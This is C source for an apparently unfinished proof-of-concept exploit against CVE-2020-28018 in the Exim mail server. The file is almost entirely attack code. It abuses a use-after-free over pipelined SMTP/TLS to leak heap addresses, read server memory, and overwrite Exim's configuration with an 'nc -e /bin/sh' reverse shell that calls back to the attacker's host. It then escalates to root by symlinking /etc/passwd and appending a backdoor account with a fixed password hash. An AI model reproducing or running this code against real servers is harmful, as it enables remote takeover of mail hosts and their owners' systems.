/*

    CVE-2020-28018 PoC: Exim Use-After-Free leading to Remote Code Execution

	- @lockedbyte -
	

      --- STILL NOT FINISHED ---

*/


#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <resolv.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

/* -- START EXP CONFIG -- */

#define PIPLN_ITER 0x9
#define POST_PIPLN_ITER 0x2
#define BASE_OFF 0x2ad90
#define STRCT_OFF 0x1b
#define CFG_QUERY "${lookup"

/* -- END EXP CONFIG */

/* -- START EXP SETTINGS -- */

unsigned int output_level = 0;

#ifndef DEBUG
	#define DEBUG 0
#endif

#ifndef DELAY_TIME
	#define DELAY_TIME 0.5
#endif

/*-- END EXP SETTINGS -- */

#ifndef BIND_PORT
	#define BIND_PORT 4444 
#endif

#ifndef INJECT_CFG
	#define INJECT_CFG "${run{nc -e /bin/sh %s %d}}\n\n#"
#endif

#ifndef FAIL
	#define FAIL -1
#endif

#ifndef HEXDUMP_COLS
	#define HEXDUMP_COLS 16
#endif

#ifndef MAX_HOST
	#define MAX_HOST 4096
#endif

#ifndef MAX_CONFIG_SZ
	#define MAX_CONFIG_SZ 1024
#endif

#ifndef MAX_PIPLN_SZ
	#define MAX_PIPLN_SZ 1024*1024
#endif

#ifndef MAX_STRUCT_OVERWRITE_SZ
	#define MAX_STRUCT_OVERWRITE_SZ 1024*1024
#endif

#ifndef ADDR_ANY_X
	#define ADDR_ANY_X "0.0.0.0"
#endif

#ifndef MAX_POST_PIPLN_SZ
	#define MAX_POST_PIPLN_SZ 1024*1024
#endif

#ifndef HEAP_RANGE_OFF
	#define HEAP_RANGE_OFF 0x100000
#endif

enum CONN_T {
		CLEARTEXT_T,
		TLS_T
             };

SSL_CTX *ctx = NULL;

unsigned int leak_flg = 0;
unsigned int data_flg = 0;
unsigned int found_flg = 0;
unsigned int mem_flg = 0;

unsigned long READ_SZ = 0x1000;

unsigned long heap_base = NULL;
unsigned long curr_heap = NULL;
unsigned long config_addr = NULL;

char *mem_exfil = NULL;

char target_hostn[MAX_HOST];


/* --- START COMMANDS --- */

#define EHLO_CMD "EHLO pwner\n"
#define STARTTLS_CMD "STARTTLS\n"
#define PIPLN_01_CMD_X "MAIL FROM: <>\nNO"
#define PIPLN_02_CMD "OP\n"

/* --- END COMMANDS --- */


/* --- START CONN-RELATED FUNCTIONS --- */

int remote_conn(const char *hostname, int port) {
    int sd = 0;
    struct hostent *host = NULL;
    struct sockaddr_in addr;
    if((host = gethostbyname(hostname)) == NULL) {
        puts("[-] Something went wrong resolving target hostname");
        exit(1);
    }
    sd = socket(PF_INET, SOCK_STREAM, 0);
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = *(long*)(host->h_addr);
    if(connect(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        close(sd);
	puts("[-] Something went wrong connecting to target");
	exit(1);
    }
    return sd;
}

SSL_CTX *init_ctx_x(void) {
    SSL_METHOD *method = NULL;
    SSL_CTX *ctx = NULL;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    method = TLSv1_2_client_method();
    ctx = SSL_CTX_new(method);
    if (ctx == NULL) {
        puts("[-] Something went wrong in init_ctx_x()");
        exit(1);
    }
    return ctx;
}

SSL *initialize_enc_channel(int fd) {
	SSL *ssl = NULL;
	SSL_library_init();
	ctx = init_ctx_x();
	ssl = SSL_new(ctx);
	SSL_set_fd(ssl, fd);
	if(SSL_connect(ssl) == FAIL) {
		puts("[-] Something went wrong initializing encrypted channel");
		return NULL;
	}
	return ssl;
}

void show_certs(SSL* ssl) {
    X509 *cert = NULL;
    char *line = NULL;
    cert = SSL_get_peer_certificate(ssl);
    if (cert != NULL) {
        printf("[+] Server certificates:\n");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        printf("\t[i] Subject: %s\n", line);
        if(line)
        	free(line);
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        printf("\t[i] Issuer: %s\n", line);
        if(line) {
        	free(line);
        	line = NULL;
        }
        if(cert) {
        	X509_free(cert);
        	cert = NULL;
        }
    } else
        puts("[i] No client certificates configured");
    return;
}

void close_tls_channel(SSL *ssl) {
	SSL_shutdown(ssl);
	SSL_free(ssl);
	return;
}


int send_data(long fd, char *buf, size_t size, int method_t) {
	int ret = 0;
	switch(method_t) {
		case CLEARTEXT_T:
			ret = write(fd, buf, size);
			break;
		case TLS_T:
			ret = SSL_write((SSL *)fd, buf, size);
			break;
		default:
			puts("[-] Unknown error ocurred.");
			exit(1);
	}
	return ret;
}

int recv_data(long fd, char *buf, size_t size, int method_t) {
	int ret = 0;
	switch(method_t) {
		case CLEARTEXT_T:
			ret = read(fd, buf, size);
			break;
		case TLS_T:
			ret = SSL_read((SSL *)fd, buf, size);
			break;
		default:
			puts("[-] Unknown error ocurred.");
			exit(1);
	}
	return ret;
}

void exchange_data(long fd, char *buf, size_t size, int send_flg, int recv_flg, int method_t) {
	if(send_flg) {
	        #if DEBUG
	        	printf("[DEBUG] Sending: %s\n", buf);
	        #endif
	        if(!mem_flg)
			send_data(fd, buf, strlen(buf), method_t);
		else
			send_data(fd, buf, mem_flg, method_t);
	}
	sleep(DELAY_TIME);
	if(recv_flg) {
		if(mem_flg) {
			recv_data(fd, mem_exfil, READ_SZ, method_t);
		} else {
			recv_data(fd, buf, size, method_t);
			buf[size-1] = '\0';
		}
		#if DEBUG
			printf("%s", buf);
		#endif
		if(leak_flg) {
			puts("\n[+] Memory leak: ");
			hexdump(buf, size/16);
			puts("");
			identify_leak(buf, size);
		} else if(data_flg) {
			#if DEBUG
				puts("\n[+] Output Data: ");
				hexdump(mem_exfil, size/16);
				puts("");
			#endif
			identify_config(mem_exfil, MAX_POST_PIPLN_SZ);
		}
	}
	sleep(DELAY_TIME);
	return;
}

void retrieve_host(char *hostname, int port) {
	
}

/* --- END CONN-RELATED FUNCTIONS --- */


void hexdump(void *mem, unsigned int len) {
        unsigned int i = 0, j = 0;
        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
                if(i % HEXDUMP_COLS == 0)
                        printf("0x%06x: ", i);
                if(i < len)
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                else
                        printf("   ");
                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                                if(j >= len)
                                        putchar(' ');
                                else if(isprint(((char*)mem)[j]))
                                        putchar(0xFF & ((char*)mem)[j]);       
                                else
                                        putchar('.');
                        }
                        putchar('\n');
                }
        }
}

char *strstrx(const char *str1, size_t sz_1, const char *str2) {
	int i = 0;
	char *f = NULL;
	while(i < sz_1) {
		if(str1[i] == str2[0]) {
			if(memcmp(str1+i, str2, strlen(str2)) == 0) {
				f = str1+i;
				break;
			}
		}
		i++;
	}
	return f;
}

void pausex(void) {
	char buf[1];
	read(0, buf, 1);
	return;
}

void reinit_mem(char *buf, size_t size, const char *str) {
	memset(buf, '\0', size);
	if(mem_flg) {
		memcpy(buf, str, mem_flg);
		return;
	}
	strncpy(buf, str, size);
	buf[size-1] = '\0';
	return;
}

void identify_config(char *buf, size_t size) {
	char *f = NULL;
	unsigned long r_ptr = NULL;
	buf[size-1] = '\0'; /* ensure buf is NULL-terminated */
	f = strstrx(buf, size, CFG_QUERY);
	if(f) {
		found_flg = 1;
		r_ptr = curr_heap+(f-buf);
		config_addr = r_ptr;
	}
	return;
}

void identify_leak(char *buf, size_t size) {
	int i = 0, x = 0;
	uint64_t *leak = NULL;
	int addr_idx = 0;
	char lk[sizeof(uint64_t)];
	
	memset(lk, '\0', sizeof(lk));
	
	while(i < size) {
		if(buf[i++] == 0x55) {
			addr_idx = i+2;
			break;
		}
	}
	
	x = 0;
	while(x < sizeof(uint64_t)) {
		lk[x++] = buf[(addr_idx++)-8];
	}
	
	leak = &lk;
	heap_base = (*leak - BASE_OFF) - 0x65000;
	
	printf("\t[+] Leaked heap address = 0x%lx\n", *leak);
	printf("\t[+] Leaked heap_base = 0x%lx\n\n", heap_base);
	
	return;
}

int leak_phase(char *hostname, int port) {

	long fd = 0;
	int count = 0;
	int i = 0, x = 0;
	SSL *ssl = NULL;
	char *PIPLN_01_CMD = NULL;
	char *POST_PIPLN = NULL;
	char buf[4096];

	memset(buf, '\0', sizeof(buf));

	PIPLN_01_CMD = calloc(MAX_PIPLN_SZ, sizeof(char));
	POST_PIPLN = calloc(MAX_POST_PIPLN_SZ, sizeof(char));
	
	if(output_level)
		printf("[+] Connecting to %s:%d\n", hostname, port);
	
	fd = remote_conn(hostname, port);
	
	exchange_data(fd, buf, sizeof(buf)-1, 0, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Sending EHLO...");
		
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Initializing an encrypted TLS channel...");
		
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);
	
	if(!ssl)
		exit(1);
	
	if(output_level)
		printf("[+] Initialized encrypted channel with %s:%d (%s)\n", hostname, 	
		                                                        port, 
		                                                   SSL_get_cipher(ssl));
	show_certs(ssl);
	
	if(output_level)
		puts("[*] Sending EHLO...");
		
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);

	reinit_mem(buf, sizeof(buf), "MAIL FROM: <>\n");
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	if(output_level)
		puts("[*] Sending pipelined command #1...");
	
	i = 0;
	while(i < PIPLN_ITER) {
		strncat(PIPLN_01_CMD, "RCPT TO: postmaster\n", MAX_PIPLN_SZ-1);
		i++;
	}
	strncat(PIPLN_01_CMD, "NO", MAX_PIPLN_SZ-1);

	reinit_mem(buf, sizeof(buf), PIPLN_01_CMD);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 0, TLS_T);
	
	if(output_level)
		puts("[*] Closing TLS connection channel...");
		
	close_tls_channel(ssl);
	
	ssl = NULL;
	
	if(output_level)
		puts("[*] Sending pipelined command #2...");
		
	reinit_mem(buf, sizeof(buf), PIPLN_02_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);

	x = 0;
	while(x < POST_PIPLN_ITER) {
		strncat(POST_PIPLN, "RCPT TO: root@localhost\n", MAX_POST_PIPLN_SZ-1);
		x++;
	}
	
	reinit_mem(buf, sizeof(buf), POST_PIPLN);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Sending EHLO...");
	
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Re-initializing an encrypted TLS channel...");
	
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);
	
	if(!ssl)
		exit(1);
	
	if(output_level)
		printf("[+] Initialized encrypted channel with %s:%d (%s)\n", hostname, 
		                                                            port, 
		                                                         SSL_get_cipher(ssl));
	
	/* not two times right? */	
	//show_certs(ssl);
	
	if(output_level)
		puts("[*] Triggering Use-After-Free...");
	
	leak_flg = 1;
	
	reinit_mem(buf, sizeof(buf), "NOOP\r\n");
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	leak_flg = 0;
	
	if(PIPLN_01_CMD) {
		free(PIPLN_01_CMD);
		PIPLN_01_CMD = NULL;
	}

	if(POST_PIPLN) {
		free(POST_PIPLN);
		POST_PIPLN = NULL;
	}
	
	if(ssl) {
		SSL_free(ssl);
		ssl = NULL;
	}
	if(ctx) {
		SSL_CTX_free(ctx);
		ctx = NULL;
	}
	close(fd);

	return 1;
}

int arbitrary_read(char *hostname, int port) {

	long fd = 0;
	int count = 0;
	int i = 0, x = 0, l = 0;
	SSL *ssl = NULL;
	char *STRUCT_OVERWRITE = NULL;
	char *POST_PIPLN = NULL;
	char buf[4096];

	memset(buf, '\0', sizeof(buf));
	
	POST_PIPLN = calloc(MAX_POST_PIPLN_SZ, sizeof(char));
	STRUCT_OVERWRITE = calloc(MAX_STRUCT_OVERWRITE_SZ, sizeof(char));
	
	if(output_level)
		printf("[+] Connecting to %s:%d\n", hostname, port);
	
	fd = remote_conn(hostname, port);
	
	exchange_data(fd, buf, sizeof(buf)-1, 0, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Sending EHLO...");
		
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Initializing an encrypted TLS channel...");
		
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);
	
	if(!ssl)
		return;
	
	if(output_level)
		printf("[+] Initialized encrypted channel with %s:%d (%s)\n", hostname, 	
		                                                        port, 
		                                                   SSL_get_cipher(ssl));
	//show_certs(ssl);
	
	if(output_level)
		puts("[*] Sending EHLO...");
		
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	if(output_level)
		puts("[*] Sending pipelined command #1...");

	reinit_mem(buf, sizeof(buf), PIPLN_01_CMD_X);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 0, TLS_T);
	
	if(output_level)
		puts("[*] Closing TLS connection channel...");
		
	close_tls_channel(ssl);
	
	ssl = NULL;
	
	if(output_level)
		puts("[*] Sending pipelined command #2...");
		
	reinit_mem(buf, sizeof(buf), PIPLN_02_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);

	x = 0;
	while(x < POST_PIPLN_ITER) {
		strncat(POST_PIPLN, "RCPT TO: root@localhost\n", MAX_POST_PIPLN_SZ-1);
		x++;
	}
	
	reinit_mem(buf, sizeof(buf), POST_PIPLN);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Sending EHLO...");
	
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Re-initializing an encrypted TLS channel...");
	
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);

	if(!ssl)
		return;
		
	if(output_level)
		printf("[+] Initialized encrypted channel with %s:%d (%s)\n", hostname, 
		                                                            port, 
		                                                         SSL_get_cipher(ssl));
	
	/* not two times right? */	
	//show_certs(ssl);
	
	if(output_level)
		puts("[*] Triggering Use-After-Free...");
	
	data_flg = 1;
	
	memcpy(STRUCT_OVERWRITE, "MAIL FROM: A=", strlen("MAIL FROM: A=")+1);
	
	x = strlen(STRUCT_OVERWRITE);
	l = x;
	while(x < l+STRCT_OFF) {
		STRUCT_OVERWRITE[x++] = 0x59;
	}
	STRUCT_OVERWRITE[x++] = 0x00;
	
	memcpy(STRUCT_OVERWRITE+strlen(STRUCT_OVERWRITE), &READ_SZ, 4);		/* g->size = *high value* */
	memcpy(STRUCT_OVERWRITE+strlen(STRUCT_OVERWRITE)+4, &READ_SZ, 4);		/* g->ptr = *high value* */
	memcpy(STRUCT_OVERWRITE+strlen(STRUCT_OVERWRITE)+8, &curr_heap, 8);		/* g->s = *where* */

	memcpy(STRUCT_OVERWRITE+strlen(STRUCT_OVERWRITE)+16, " <>\n", 5);		/* just the sender */
	
	mem_flg = 60; /* "MAIL FROM: A=" + uint32_t + uint32_t + uint64_t + " <>\n\x00" */
	
	#if DEBUG
		hexdump(STRUCT_OVERWRITE, 100);
	#endif
	
	reinit_mem(buf, sizeof(buf), STRUCT_OVERWRITE);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	mem_flg = 0;
	data_flg = 0;
	
	if(STRUCT_OVERWRITE) {
		free(STRUCT_OVERWRITE);
		STRUCT_OVERWRITE = NULL;
	}

	if(POST_PIPLN) {
		free(POST_PIPLN);
		POST_PIPLN = NULL;
	}
	
	if(ssl) {
		SSL_free(ssl);
		ssl = NULL;
	}
	if(ctx) {
		SSL_CTX_free(ctx);
		ctx = NULL;
	}
	close(fd);

	return 1;
}

int search_config(char *hostname, int port) {
	int i = 0;
	int ret = 0;
	pausex();
	mem_exfil = calloc(HEAP_RANGE_OFF, sizeof(char));
	curr_heap = heap_base;
	while(i < (HEAP_RANGE_OFF/READ_SZ)) {
		arbitrary_read(hostname, port);
		curr_heap += READ_SZ;
		if(found_flg) {
			printf("\t[+] Config found at: 0x%lx\n\n", config_addr);
			ret = 1;
			break;
		}
		i++;
	}
	return ret;
}

int write_what_where(char *hostname, int port, char *injected_config) {
	long fd = 0;
	int count = 0;
	int curr = 0;
	int i = 0, x = 0, l = 0;
	SSL *ssl = NULL;
	char *STRUCT_OVERWRITE = NULL;
	unsigned long inject_point = NULL;
	char *POST_PIPLN = NULL;
	char buf[4096];

	memset(buf, '\0', sizeof(buf));
	
	POST_PIPLN = calloc(MAX_POST_PIPLN_SZ, sizeof(char));
	STRUCT_OVERWRITE = calloc(MAX_STRUCT_OVERWRITE_SZ, sizeof(char));
	
	if(output_level)
		printf("[+] Connecting to %s:%d\n", hostname, port);
	
	fd = remote_conn(hostname, port);
	
	exchange_data(fd, buf, sizeof(buf)-1, 0, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Sending EHLO...");
		
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Initializing an encrypted TLS channel...");
		
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);
	
	if(!ssl)
		return;
	
	if(output_level)
		printf("[+] Initialized encrypted channel with %s:%d (%s)\n", hostname, 	
		                                                        port, 
		                                                   SSL_get_cipher(ssl));
	show_certs(ssl);
	
	if(output_level)
		puts("[*] Sending EHLO...");
		
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	if(output_level)
		puts("[*] Sending pipelined command #1...");

	reinit_mem(buf, sizeof(buf), PIPLN_01_CMD_X);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 0, TLS_T);
	
	if(output_level)
		puts("[*] Closing TLS connection channel...");
		
	close_tls_channel(ssl);
	
	ssl = NULL;
	
	if(output_level)
		puts("[*] Sending pipelined command #2...");
		
	reinit_mem(buf, sizeof(buf), PIPLN_02_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);

	x = 0;
	while(x < POST_PIPLN_ITER) {
		strncat(POST_PIPLN, "RCPT TO: root@localhost\n", MAX_POST_PIPLN_SZ-1);
		x++;
	}
	
	reinit_mem(buf, sizeof(buf), POST_PIPLN);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Sending EHLO...");
	
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Re-initializing an encrypted TLS channel...");
	
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);

	if(!ssl)
		return;
		
	if(output_level)
		printf("[+] Initialized encrypted channel with %s:%d (%s)\n", hostname, 
		                                                            port, 
		                                                         SSL_get_cipher(ssl));
	
	/* not two times right? */	
	//show_certs(ssl);
	
	if(output_level)
		puts("[*] Triggering Use-After-Free...");
	
	data_flg = 1;
	
	memcpy(STRUCT_OVERWRITE, "MAIL FROM: A=", strlen("MAIL FROM: A=")+1);
	
	x = strlen(STRUCT_OVERWRITE);
	l = x;
	while(x < l+STRCT_OFF) {
		STRUCT_OVERWRITE[x++] = 0x59;
	}
	
	inject_point = config_addr - (strlen("501 A=") + STRCT_OFF + 4*2 + 8); /* we write some bytes before */
	
	printf("\t[+] inject_point = 0x%lx\n", inject_point);
	
	curr = 13 + STRCT_OFF;
	
	memcpy(STRUCT_OVERWRITE+curr, "AAAA", 4); 			/* g->size = *high value* */
	curr+=4;
	memcpy(STRUCT_OVERWRITE+curr, "\x00\x00\x00\x00", 4); 	/* g->ptr = 0 */
	curr+=4;
	memcpy(STRUCT_OVERWRITE+curr, &inject_point, 8);		/* g->s = *where* */
	curr+=8;
	memcpy(STRUCT_OVERWRITE+curr, injected_config, strlen(injected_config)); /* our payload will be returned on response */
	curr+=strlen(injected_config);
	memcpy(STRUCT_OVERWRITE+curr, " <AA>\n\n", 7);	 /* just to make it fail (domain required err) */
	
	mem_flg = curr+6;
	
	#if DEBUG
		hexdump(STRUCT_OVERWRITE, 100);
	#endif
	
	reinit_mem(buf, sizeof(buf), STRUCT_OVERWRITE);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);

	mem_flg = 0;
	data_flg = 0;
	
	//reinit_mem(buf, sizeof(buf), "MAIL FROM: A=ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ <>\n");
	//exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
		
	if(STRUCT_OVERWRITE) {
		free(STRUCT_OVERWRITE);
		STRUCT_OVERWRITE = NULL;
	}

	if(POST_PIPLN) {
		free(POST_PIPLN);
		POST_PIPLN = NULL;
	}
	
	if(ssl) {
		SSL_free(ssl);
		ssl = NULL;
	}
	if(ctx) {
		SSL_CTX_free(ctx);
		ctx = NULL;
	}
	close(fd);

	return 1;
}

int inject_cmd(char *hostname, int port, char *attacker_host, int attacker_port) {
	char injected_config[MAX_CONFIG_SZ];
	pausex();
	memset(injected_config, '\0', sizeof(injected_config));
	snprintf(injected_config, sizeof(injected_config)-1, INJECT_CFG, attacker_host, attacker_port);
	return write_what_where(hostname, port, injected_config);
	
}

void exploit_lpe(int fd) {
	write(fd, "/bin/bash\n", 11);
	write(fd, "cd /var/spool/exim4/db\n", 24);
	write(fd, "rm -f retry*\n", 14);
	write(fd, "ln -s -f /etc/passwd retry.passwd\n", 35);
	write(fd, "/usr/sbin/exim4 -odf -oep postmaster < /dev/null\n", 50);
	/* creds => pwner:pwner */
	write(fd, "echo 'pwner:$6$4KB5snZ5jevx6TFa$VNdvb49sUfHhAQeKCkbpGVDnHUbnNfbpFh.QVjwIqvGlYsyKp8yoYrAfNDcG0XdtoQ2vT9LQPLml6XmCaVCOX/:18757:0:99999:7:::' >> /etc/passwd\n", 155);
	write(fd, "su -l pwner\n", 13);
	write(fd, "pwner\n", 7);
	return;
}

void start_listener(void) {

	int sock = 0, s = 0;
	int sx = 1;
	struct sockaddr_in server_address, client_address;
	int i = 0, optval = 1;
	socklen_t client_lenght;
	sock = socket(AF_INET, SOCK_STREAM, 0);

	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
		puts("[-] Something went wrong on starting listener");
		exit(1);
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr(ADDR_ANY_X);
	server_address.sin_port - htons(BIND_PORT);
	
	bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
	
	listen(sock, 5);
	client_lenght = sizeof(client_address);
	s = accept(sock, (struct sockaddr *)&client_address, &client_lenght);
	
	puts("[+] Opened shell session!");
	
	puts("[*] Escalating privileges with CVE-2020-28008 LPE...");
	/* try to escalate to root from this shell using CVE-2020-28008 (LPE) */
	exploit_lpe(s);

	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	
	while(sx) {
		continue;
	}
        
        return;
}

int main(int argc, char *argv[]) {

	int TARGET_PORT = 0;
	int ATTACKER_PORT = 0;
	pthread_t listener_p = 0;
	char TARGET_HOST[MAX_HOST];
	char ATTACKER_HOST[MAX_HOST];
	
	memset(TARGET_HOST, '\0', sizeof(TARGET_HOST));
	memset(ATTACKER_HOST, '\0', sizeof(ATTACKER_HOST));
	memset(target_hostn, '\0', sizeof(target_hostn));
		
	puts("[i] CVE-2020-28018 Proof-Of-Concept (PoC) exploit");

	if(argc < 5) {
		printf("[%%] Usage: %s <target host> <target port> <attacker host> <attacker port>\n", argv[0]);
		exit(0);
	}
	
	snprintf(TARGET_HOST, sizeof(TARGET_HOST)-1, "%s", argv[1]);
	TARGET_PORT = atoi(argv[2]);
	
	snprintf(ATTACKER_HOST, sizeof(ATTACKER_HOST)-1, "%s", argv[3]);
	ATTACKER_PORT = atoi(argv[4]);
	
	/* Will just use "localhost" ATM */
	
	//retrieve_host(TARGET_HOST, TARGET_PORT);
	
	puts("[*] Leaking heap addresses...");
	
	if(!leak_phase(TARGET_HOST, TARGET_PORT)) {
		puts("[-] Something went wrong on memory leak phase");
		exit(0);
	}
	
	puts("[*] Searching for Exim configuration in memory...");
	
	if(!search_config(TARGET_HOST, TARGET_PORT)) {
		puts("[-] Something went wrong on config search phase");
		exit(0);
	}
	
	puts("[*] Corrupting Exim configuration with a malicious entry...");

	puts("[*] Starting listener...");
	
	pthread_create(&listener_p, NULL, &start_listener, NULL);

	if(!inject_cmd(TARGET_HOST, TARGET_PORT, ATTACKER_HOST, ATTACKER_PORT)) {
		puts("[-] Something went wrong on config corruption phase");
		exit(0);
	}

	pthread_join(listener_p, NULL);
	pthread_exit(NULL);
	
	puts("[+] Exploit completed!");
	
	return 0;
}
